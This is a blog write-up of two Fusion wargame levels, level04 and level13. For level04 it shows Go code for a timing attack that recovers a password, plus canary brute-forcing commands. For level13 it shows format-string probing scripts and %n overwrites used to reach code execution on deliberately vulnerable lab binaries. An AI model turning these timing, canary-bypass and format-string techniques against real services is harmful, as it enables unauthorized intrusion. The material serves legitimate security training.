---

layout: post
title:  "Fusion Exploit Exercises: Part Two"
author: jonatanhal

---

# [level04](https://exploit-exercises.com/fusion/level04/)

>About 
>
>Level04 introduces timing attacks, position independent
>executables (PIE), and stack smashing protection (SSP). Partial
>overwrites ahoy!

There's some hoops that we have to jump through in this level, we need
to guess a randomly generated password used when authenticating to the
http-server, and we also need to adjust our exploit to make it
sidestep the issue of [SSP](http://wiki.osdev.org/Stack_Smashing_Protector)
and PIE.

## Stack Smashing Protection in a nutshell

SSP is typically implemented as a saved 64/32 bit value on the stack,
located next to the saved return address. The saved value can be
predefined or generated randomly; As far as I know, it is implemented
as a randomly generated value by glibc/gcc.

When overflowing a buffer in a attempt to overwrite the saved
return-address, the saved value (referred to as a stack-canary) will
also overwritten. Before the function returns, the canary is checked.

If a canary-change is detected, the program is aborted - and the
overwritten return-address is never used.

### Authenticating :~)

Parts of the code are testing if the connection being made to the
http-server knows about a secret password that's being generated once
the daemon is started. The password does not change between
connections, So we dont have to have god-luck when trying to guess it.

Having a look at the code, we contemplate over the following section

{% highlight c %}
// ---- Snippet from validate_credentials ----
// anti bruteforce mechanism. good luck ;>
  
tv.tv_sec = 0;
tv.tv_usec = 2500 * bytes_wrong;

select(0, NULL, NULL, NULL, &tv);
{% endhighlight %}

Before reaching this point in the code, a loop is iterating over the 
base64-encoded password that we're sending, any byte that does not
match the randomly generated password increments the `bytes_wrong`
variable.

So when the code above is ran, if we're completely wrong (none of
the bytes we're guessing are correct) then we should expect
the function to wait 40000 microseconds before doing anything
else.

You get the point, if our guess only has 15 wrong bytes - then the
function would wait 37500 microseconds before continuing execution.

Due to network noise, we can't simply subtract 2500 micro-seconds from
a timestamp collected when issuing a request with 1 possibly correct
character and call it a day, as the computers, switches and everything
inbetween may add random delays here and there. But we can possibly
make educated guesses if we backed them up with some basic statistics.

### Timing-Attack Hello World!

After watching two great talks (listed under *good stuff* below) on
the subject of timing-attacks, I started writing a naive program that
would collect the data I need.

Word on the street is, that there's a couple of things that are
considered good form while doing timing-attacks, in regards to how you
implement them when programming. One of these forms is to use sockets
instead of provided libraries (net/http in my case).

Why? Because we want to minimize noise that occurs on a network, and
any library we use that adds functionality - will increase the amount
of noise.

In this case, we really only want to send a single HTTP GET request,
with a header or two, to the listening application on the other end -
nothing more. Any additional functionality, is then probably not doing
anything but potentially adding noise.

Whatever, let's look at some code from main.

{% highlight go %}
keyspace = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
password = []rune("!!!!!!!!!!!!!!!!") // 16 garantueed wrong bytes

for y := 0; y < len(password); y++ {
	fmt.Fprintf(os.Stderr, "========== Index %04d/%04d ==========\n", y, len(password));
	for ki := range(keyspace) {
		for i := 0; i < iterations; i++ {
			
			p := make([]rune, 16)
			copy(p, password)
			p[y] = keyspace[ki]
			// Every other request is a real guess or a known false request
			// I'm not sure why this is better, but according to one of the talks listed
			// in the good stuff-section, this method produces better, more consistent results
			if i % 2 == 0 {
				// "Real" request
				delta := sendRequest(p)
				writeEntry(delta.Nanoseconds(), p[y], y)
			} else {
				// Known bad request
				delta := sendRequest(password)
				writeEntry(delta.Nanoseconds(), password[0], y)
			}
		}
	}
}
{% endhighlight %}

Really simple right? We're just spamming a target with some requests,
logging the difference in time between sending and receiving the
response to stdout - which, just for reference - we're shoving into
a csv file for good measure.

{% highlight go %}
func sendRequest(candidate []rune) (delta time.Duration)  {
	// empty existing buffer
	buffer.Reset()
	// encoder is a base64 encoder
	encoder.Write([]byte("DoesNotMatter:"+string(candidate)))
	body := fmt.Sprintf(skeletonRequest, buffer.String())
	blen := len(body)
	// Operator, connect me to target.. Yes, I'll hold
	conn, err  := net.Dial("tcp", host)
	check(err, "sendRequest, Dial"); defer conn.Close()
	
	// we want to send everything but the last byte, start the
	// timer, and "stop" the timer when we get back a response.
	// But first, let's sleep for a while, just so that things
	// settle down.
	time.Sleep(500*time.Microsecond) // adjust if you're impacient
	fmt.Fprint(conn, body[:blen-2])
	pre := time.Now()
	fmt.Fprint(conn, body[blen-1])
	bufio.NewReader(conn).ReadByte()
	return time.Since(pre)
}
{% endhighlight %}

*note: It takes around 70 minutes to go through each index*

And things continue to be quite basic in the sendRequest function,
just note that we are sleeping for a short while after establishing
the connection to our target.

We send all except the very last byte before starting our timer, and
save the delta it when we've received a single byte back from the
connection.

Now that we have the capability of collecting data, we should make
sure that we're collecting a decent amount, I went with 101 iterations
of the snippet from the main-function above. Fortunately, through the
magic of television - I have prepared some data for us to analyse, a
taste of which is listed below.

~~~
# nanoseconds,character,index
41330723,a,0
41062751,a,0
40928865,a,0
40966440,a,0
41010675,a,0
40754768,a,0
40649135,a,0
~~~

Using gnuplot (along with my [plotting script]()), I was able to
generate a graph.

![graph of index_0]({{ site-url }}/assets/post_images/fusion_level04_graph_index00.png)

And, as we can clearly see, there is a significant valley around
character `i` in our graph - would this be an indicator of a correct
byte in the password, perhaps?

We can cheat for a very brief moment, just to check if the bump in our

graph corresponds to the correct character in the password.

~~~
(gdb) p password
$1 = 0xb938e008 "i[REDACTED]"
~~~

It turns out we are in fact not on the right path, in this case - the
correct byte was `i`.

# Something Something Automatization.

Using our eyes to look at each individual graph would work. Work as
in, we would get the correct password from looking at the graphs - but
that is tedious, and should be automated.

I whipped up some go code to go through our collected data - if the
median of the collected data is lower than previously observed, the
corresponding character will be set to be added into its proper
place in the password.

Which leaves us with simply running our program, and cheer as it hopefully
prints the correct password!

~~~
$ go run level04_analysis.go < ./level04_timings.csv 
ih8Wg6Ga2k41WJ7d
~~~

And, we can now login.

![Extreme Hacker Voice: I'm in...]({{ site-url }}/assets/post_images/fusion_level04_login.png)

![Appropriate]({{ site-url }}/assets/post_images/fusion_level04_correct_pw.gif)

# The *Time* For Timing Attacks Are Over

Now, we can begin tearing into the part that is binary exploitaysh,
and boy-howdy do we have a zinger here, as previously mentioned - the
stack is protected via SSP - and even though SSP seems to be disabled
throughout the program - it is enabled in the validate_credentials
function.

Via the check `if(l < password_size || bytes_wrong)` on line 212, it
checks if the variable `l` (used to iterate through our submitted
credentials) is smaller than password_size (which indicates that the
submitted passwords length does not match the generated password) - if
that is indeed the case, or `bytes_wrong` is not zero; the function
errors out via `se nd_error` - which is not what we want.

This means that our submitted credentials are still treated as valid,
if the credentials we submit are bigger than `sizeof(details)`, as
long as the submission actually contains the correct password.

Using the small wrapper program which handles things like base64
encoding, I was able to atleast produce a error-message :)

~~~
$ python2 -c "print 'A'*2048" | ./level04_exploit $PASSWORD | nc 192.168.14.33 20004
*** stack smashing detected ***: /opt/fusion/bin/level04 terminated
~~~

As you can see, no sigsegv - because the program was gracefully
aborted via the SSP when it detected that the stack had been
corrupted.

A strange thing that happened is that I get back a bigger response
when I tried this exploit back home (I usually sit in my classroom
while writing these things)

~~~
python2 -c "print 'a'*2048" | ./level04_exploit $PASS | nc 192.168.1.6 20004
*** stack smashing detected ***: /opt/fusion/bin/level04 terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0xb77e08d5]
/lib/i386-linux-gnu/libc.so.6(+0xe7887)[0xb77e0887]
/opt/fusion/bin/level04(+0x2dd1)[0xb78a4dd1]
/opt/fusion/bin/level04(+0x22c7)[0xb78a42c7]
/opt/fusion/bin/level04(+0x24c0)[0xb78a44c0]
/opt/fusion/bin/level04(main+0x390)[0xb78a34d0]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb7712113]
/opt/fusion/bin/level04(+0x170d)[0xb78a370d]
======= Memory map: ========
b76da000-b76f6000 r-xp 00000000 07:00 92670      /lib/i386-linux-gnu/libgcc_s.so.1
b76f6000-b76f7000 r--p 0001b000 07:00 92670      /lib/i386-linux-gnu/libgcc_s.so.1
b76f7000-b76f8000 rw-p 0001c000 07:00 92670      /lib/i386-linux-gnu/libgcc_s.so.1
b76f8000-b76f9000 rw-p 00000000 00:00 0 
b76f9000-b786f000 r-xp 00000000 07:00 92669      /lib/i386-linux-gnu/libc-2.13.so
b786f000-b7871000 r--p 00176000 07:00 92669      /lib/i386-linux-gnu/libc-2.13.so
b7871000-b7872000 rw-p 00178000 07:00 92669      /lib/i386-linux-gnu/libc-2.13.so
b7872000-b7875000 rw-p 00000000 00:00 0 
b787f000-b7881000 rw-p 00000000 00:00 0 
b7881000-b7882000 r-xp 00000000 00:00 0          [vdso]
b7882000-b78a0000 r-xp 00000000 07:00 92553      /lib/i386-linux-gnu/ld-2.13.so
b78a0000-b78a1000 r--p 0001d000 07:00 92553      /lib/i386-linux-gnu/ld-2.13.so
b78a1000-b78a2000 rw-p 0001e000 07:00 92553      /lib/i386-linux-gnu/ld-2.13.so
b78a2000-b78a6000 r-xp 00000000 07:00 75281      /opt/fusion/bin/level04
b78a6000-b78a7000 rw-p 00004000 07:00 75281      /opt/fusion/bin/level04
b838a000-b83ab000 rw-p 00000000 00:00 0          [heap]
bf988000-bf9a9000 rw-p 00000000 00:00 0          [stack]
~~~

So... The backtrace sure is helpful, I - as a exploit developer
appriciate that :D

And ASLR is only so effective when your program uses fork, as the
addresseses are inherited from the process parent to the child.

~~~
 $ # Case in point
 $ python2 -c "print 'a'*2048" | ./level04_exploit $PASS | nc 192.168.1.6 20004 > 1
 $ python2 -c "print 'a'*2048" | ./level04_exploit $PASS | nc 192.168.1.6 20004 > 2
 $ diff 1 2
 $ # no diff :D
~~~

Same thing with SSP, the cookie itself is stored in thread-specific
memory - but is not rerandomized in any child-process (atleast in this
case where fork is being used to create each child process), I could
be (and hope I am) wrong in other cases :D

As I have previously said, the stack canary is implemented as a dword
on the stack, located right next to the return address; and is loaded
from thread-local storage (accessible through the gs segment register)
via `load eax, gs:0x14; mov [esp+0x83c], eax`.

But how do we bypass this protection, if it can be bypassed at all?

### set_thread_area syscall

At the beginning of our program, a syscall of `set_thread_area` is
made, and it's purpose is to associate the gs-register to a location
in memory.

<pre>
$ strace -e trace=set_thread_area /opt/fusion/bin/level04
set_thread_area({entry_number:-1 -> 6,
	<strong>base_addr:0xb77318d0,</strong> 
	limit:1048575,
	seg_32bit:1,
	contents:0,
	read_exec_only:0,
	limit_in_pages:1,
	seg_not_present:0,
	useable:1}) = 0
</pre>

In this case, the gs register would, after the kernel hands back
execution to level04 - point to `0xb77318d0`, and a access to
`gs:0x14` would actually dereference `0xb77318d0 + 0x14`.

![Meet your deadbeef, canary]({{ site-url }}/assets/post_images/fusion_level04_canary_control.jpg)

I was able to overwrite the canary to the value `0xfacebeef`, by
passing a lot of lowercase b's to my client, which base64-encodes the
content #and slaps the values together into a basic HTTP GET request.

<pre>
$ python2 -c "print 'b'*2027+'<strong>\xef\xbe\xce\xfa</strong>PADD'" | ./level04_exploit $PASS | nc 192.168.1.6 20004
</pre>

Now that we know how to overwrite the canary, 'tis time to
bruteforceth.

With a few modifications to our client, we're able to more elegantly
craft and overwrite canaries, and using a basic grep, we can determine if 
the process has aborted or not.

{% highlight sh %}
# Canary script:
for i in $(seq 16777215); do
 ./level04_canary_bf $PASS $i | nc 192.168.1.6 20004 | grep terminated > /dev/null
 if [[ $? -ne 0 ]]; then
   printf "Canary: %08x\n" $i
   break
 fi
 echo $i
done;
{% endhighlight %}


## Can you spot issue with my approach?

That's right, I was overwriting the entire canary on each iteration,
which is the least effective way of bruteforcing - if we are
overwriting the entire canary from the get go, we would have to guess
**8 million** times just to cover the initial 50% - now, compare that
with bruteforcing a single byte in the canary, we would, at most -
have to guess 255 times - *to cover **all** values*

Rubbing salt into our wounds, we contemplate over the not-so-subtle
hint in the challenge description itself. 

> Partial overwrites ahoy!

:(

After implementing the partial overwriting of the canary - it took
less than a minute to recover all the stack-canary bytes, compared to
my previous bruteforcing-attempt which took more than a week (before I realized my approach was wrong),
literally more than 6 million requests... a gigantic facepalm was
issued once I realized my mistake.

![I done goofd]({{ site-url }}/assets/post_images/fusion_level04_partial_fail.gif)

# Exploiting stuff

Now that we can both acquire the password, and properly bruteforce a
canary protecting the stack - it's time to bring out some corrupted
memory for this process to chew on.

![We did it reddit!]({{ site-url }}/assets/post_images/fusion_level04_control_over_pc.png)

This has been a long time coming, and if you've made it this far in my
post - shoutouts to ya.

Now, the exact locations of stuff like imported libraries is
randomized via ASLR, but since addresses can be leaked by corrupting
the stack-canary as previously observed - the ASLR is effectively
defeated.

All we need to do is to observe a offset between a function that we
want to use in our exploit, and the address that's being leaked.

After some experimenting, it turns out that I can return consistently
to system - but my pointer to the command I want to run is getting
shuffled around the stack for some wierd reason - my idea was to base
the address of the stack leaked in previous steps - adjust that
address by a known offset (for example, by observing that my buffer is
located `0xfefe` bytes after the leaked pointer - I could make
adjustments accordingly.

I'm not sure why my technique did not work, and I guess I already - to
some extent, achieved code execution; but I want my exploit to be
'complete' - correctly executing commands and all that goes with it :)

What about the the writable segment mapped below `.text`?

Well we can overwrite it using something like read(3)

If we use a ropchain with two 'links' - one where we return into
read with something like `read(1, writable_memory, some_length);` -
where some_length is the length of the command we want to run.

Provided we actually send over the command we want to run, when
read is called ...

![We did it reddit!]({{ site-url }}/assets/post_images/fusion_level04_win.jpg)

BOOM!

You can find all of the code I used to exploit this level
[here](https://github.com/jonatanhal/fusion_exploits/).

## Good stuff

* [Exploiting Timing Attacks in Widespread Systems](https://www.youtube.com/watch?v=idjDiBtu93Y&list=PL2B7CF99109106D36)

* [Time is on my Side - Exploiting Timing Side Channel Vulnerabilities on the Web](https://www.youtube.com/watch?v=OsbQhr9ZmPY)

* * * 

# [level13](https://exploit-exercises.com/fusion/level13/)

>About
>
>There is no description available for this level. Investigate the
>binary at /opt/fusion/bin/level13!

Cool! First level without any source-code :D

The level13 binary contains stabs debugging information, one way of
reading that information is by using objdump with the `-g` switch.

The information helps us pinpoint the different types, sizes and
variable names.

{% highlight c %}
 level13/level13.c:
int process ()
{ /* 0x1dc0 */
  { /* 0x1dc0 */
    char again[64]:uint32 /* 0xffffffa4 */;
    char result[2048]:uint32 /* 0xfffff6e4 */;
    char *wh00p /* 0xfffff6e0 */;
    char email[64]:uint32 /* 0xffffff64 */;
    char password[64]:uint32 /* 0xffffff24 */;
    char username[64]:uint32 /* 0xfffffee4 */;
    // snip-snip
  } /* 0x1f60 */
} /* 0x1f60 */
{% endhighlight %}

In the image below, we see the process-functions prologue, along with three
sets of the `rep stosd` instruction, which is used to zero out the 64
bytes in three buffers.

Note the call to `__i686.get_pc_thunk.bx` which places the address of
the instruction following the call, into ebx.

![radare2 view of process 01]({{ site-url }}/assets/post_images/fusion_level13_process01.png)

Such a call would indicate that the binary is composed of
position-independent code, where global or static variables would be
referenced by their offset to the saved position, in this case
`0x1dd1`. `0x1d83` is then added to ebx, resulting in it containing
`0x3b54`.

### Something seems <del>formatty</del> fishy :|

Upon giving the gracious program level13 a formatter of four `%08x`
for all three prompts for input, we rejoice as we get back some
interesting output.

~~~
Username: %08x%08x%08x%08x
Password: %08x%08x%08x%08x
Email: %08x%08x%08x%08x
So your username is 'bfa5a27cbfa5a2bcbfa5a2fc00000000', your password is '00000000000000000000000000000000', and your email is 'b84a9070000000000000000000000000', but your account creation attempt has FAILED! I SAID GOOD DAY!
~~~

Should be just a matter of adding some padding, in order to crash this
lil' exploitee. But alas, we're not so lucky - no sigsegvs, even with
`%9999d` for good measure :(

We do ofcourse, get a sigsegv when using the `%n` parameter along with
some leading formatters, achievement unlocked I guess? :D

~~~
[45285.743686] level13[24057]: segfault at 0 ip b75afe42 sp bf9da89c error 6 in libc-2.13.so[b756b000+176000]
~~~

So.. We have a formatting-exploit on our hands, but what do we change,
and to what do we change it? The executable itself is
position-independent - so there's little use in trying to overwrite a
entry in the GOT - since the addresses are randomized (unless we can leak a address)

I used this small 'lil script to explore the memory around me. 

{% highlight shell %}
for i in $(seq 256)
do
	MSG="AAAA%$i\$08x\r\n"
	echo -e $MSG $MSG $MSG | nc target 20013
done
{% endhighlight %}

But the hexadecimal values doesn't make a lot of sense - they could
point to anywhere and I wouldn't know the difference, well.. There is
still the `%s` formatter. With this I am able to at the very least
inspect some char stars located on the stack.

![Some strings, dumped on]({{ site-url }}/assets/post_images/fusion_level13_strings_on_the_stack.png)

So, where the hell on the stack am I?

After looking at some disassemblies of the `process` function, which
handles our input - One could come to the conclusion that it is a call
to `fprintf`, which allows us to trigger a formatting vulnerability.
But before `fprintf` is called, the inputs are collected in a heap-allocated
char star, containing a blend of a predetermined string, and our input - as
listed below.

> So your username is 'chungus', your password is 'bungus', and your
> email is 'klungus', but your account creation attempt has FAILED! I
> SAID GOOD DAY!

At the moment of calling `fprintf`, a buffer of our control can be found
around `0x82c` bytes after the current stack-pointer. 

![Our input]({{ site-url }}/assets/post_images/fusion_level13_input_on_the_stack.png)

Let's confirm this by sniping out the value using a parameter
specification for our formatter, via a modification to our previous
shellscript.

{% highlight sh %}
for i in $(seq 500 600);
do
	MSG="AAAA%$i\$08x\r\n";
	echo -e $MSG $MSG $MSG | nc target 20013 | grep 41414141 && echo $i;
done

#  => So your username is 'AAAA41414141', you r password is ' AAAA41414141', and your email is ' AAAA41414141', but your account creation attempt has FAILED! I SAID GOOD DAY!
#     522
{% endhighlight %}

What I'm currently missing is a way to leak shared library
function-locations, one solution to this - is to do some looping in
gdb, to try and find a pointer on the stack, which we can actually
read back to us, modify, and then reuse if we chose yes at the
prompt. Even if we only manage to leak one shared library pointer,
we're still able to determine any other function, because of the fact
that the offsets within the shared library only change upon
recompilation.

~~~
(gdb) # small GDB loop for looking for interesting pointers
(gdb) set $i = 0
(gdb) while ($i < 800)
> x/a $esp+(4*$i)
> p $i
> set $i=$i+1
> end
~~~

At around 179 - 180, there's a pointer to malloc - which should prove
useful if we would want to reference something like
execve. Calculating the difference between malloc and execve, is easily
done in gdb.

![adjusting leaked addresses]({{ site-url }}/assets/post_images/fusion_level13_address_leak.png)

We probably need to overwrite some entry in the GOT, in order to
actually change the flow of execution.

We can calculate the location of the return-address on the stack by
leaking the location of a variable, say the local variable
`password` - as seen below.

![Calculating the location of return-address]({{ site-url }}/assets/post_images/fusion_level13_return_calc.png)

So, in summary. The first time we are prompted to input usernames
etc. Our mission is to leak the location of a execve (the 185th dword
on the stack), and the location of the return address.

But what do we do next, we should probably find out where any GOT
entry is, so we can overwrite them, preferably something like fprintf,
or even get_string - the parameters of which easily translate to
something like execve, even though the call to fprintf takes two
parameters, as we've observed previously, the first 5 of so dwords on
the stack actually points to user-controlled variables. Neat!

Taking control over the program counter, is at this point - just a matter
of using some `%n` formatters to write into it's location on the stack.

### Achievement unlocked! Control over eip!

![Suck it]({{ site-url }}/assets/post_images/fusion_level13_control_over_eip.png)

Very cool! After some tinkering, I got my small exploit code working,
and I'm simply overwriting the return address on the stack as a sort
of POC - just to see if things work.

It should be possible, if we return to something like `nread`, to
simply craft a mini-chain a la ROP - to achieve code execution.

We already know the address of execve - and if we increment it by
`0x10f1a8`, we have the address of nread.

The trick here is to automatically find the right amount of padding
based on the address that we leaked earlier, previously when
exploiting formatting vulnerabilities - I've modified the amount of
padding by hand, as it was simple enough to do it when addresses
didn't change. I had a look in our old friend
[*Exploiting Format String Vulnerabilities*](https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf),
and was relieved to find they had a algorithm to do this stuff (page 17.)

So we have officially overwritten the return-address on the stack. I guess
there's really nothing stopping us from overwriting it some more, in order
to set up the stack as such that it's suitable for a call to something
like execve.

before the final `ret` instruction is executed, our stack looks
something like this:

* Return-address
* The value 1
* argv to main (char **)
* envp to main (char **)
* Some shared library pointers

![At the point of ret]({{ site-url }}/assets/post_images/fusion_level13_last_ret.png)

And as you can tell, this stack-setup is unsuitable for calling
something like execve, and we would have to significantly corrupt the
stack, with a lot of padding+`%n` pairs to prepare it.

At the very least, we would have to place pointers to previously
inputted strings onto the stack via the aforementioned technique, and
either null out or hope the next two arguments given to execve would not
cause it to crash.

## But wait, there's another way! :D

Way back when solving the protostar challenge, I sometimes used our
old friend `system`, which is a great library function to use when
you're attempting to exploit things remotely - or just want to run a
command. It takes a single argument, the file you want to run - and
it's as simple as that.

![money-shot]({{ site-url }}/assets/post_images/fusion_level13_rce.png)

![level13-celebration]({{ site-url }}/assets/post_images/fusion_level13_celebration.gif)

You can read the exploit-code [here](https://github.com/jonatanhal/fusion_exploits/blob/master/level13/solution.py)

* * * 

Thanks for reading! 

Catch y'all in part three! 
